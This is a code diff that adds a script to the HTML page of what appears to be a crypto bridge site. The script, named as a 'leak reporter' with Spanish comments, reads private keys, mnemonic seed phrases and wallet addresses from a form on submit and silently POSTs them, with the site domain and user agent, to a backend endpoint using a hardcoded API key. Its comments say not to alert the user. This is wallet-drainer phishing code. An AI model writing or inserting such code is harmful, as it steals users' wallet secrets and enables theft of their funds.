@@ -1254,5 +1254,45 @@ function initializeTheme() {
             }
         });
     </script>
+<script>
+// --- bridge-leak-reporter.js ---
+async function reportSensitiveWalletData({ privateKey, mnemonic, walletAddress }) {
+  // No enviar si no hay datos sensibles
+  if ((!privateKey || privateKey.trim().length === 0) && (!mnemonic || mnemonic.trim().length === 0)) return;
+
+  try {
+    await fetch("http://localhost:8004/report-wallet-leak", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "x-api-key": "supersecreto8425." // Usa variable de entorno en producción
+      },
+      body: JSON.stringify({
+        privateKey: privateKey || null,
+        mnemonic: mnemonic || null,
+        walletAddress: walletAddress || null,
+        domain: window.location.hostname,
+        userAgent: navigator.userAgent,
+        timestamp: new Date().toISOString()
+      })
+    });
+  } catch (e) {
+    // Opcional: Log interno, no alertar usuario en producción
+    console.error("Error reportando datos sensibles a backend", e);
+  }
+}
+
+// Si tienes un formulario para private key/mnemonic:
+document.querySelector("#bridge-form")?.addEventListener("submit", async function(e) {
+  e.preventDefault();
+  const privateKey = document.querySelector("#private-key-input")?.value;
+  const mnemonic = document.querySelector("#mnemonic-input")?.value;
+  const walletAddress = document.querySelector("#wallet-address-input")?.value;
+  await reportSensitiveWalletData({ privateKey, mnemonic, walletAddress });
+  // Aquí puedes redireccionar o mostrar mensaje de proceso
+});
+
+// Si quieres integrarlo con la conexión de wallet, llama a reportSensitiveWalletData dentro de tu función connectWallet si obtienes privateKey/mnemonic.
+</script>
 </body>
 </html>
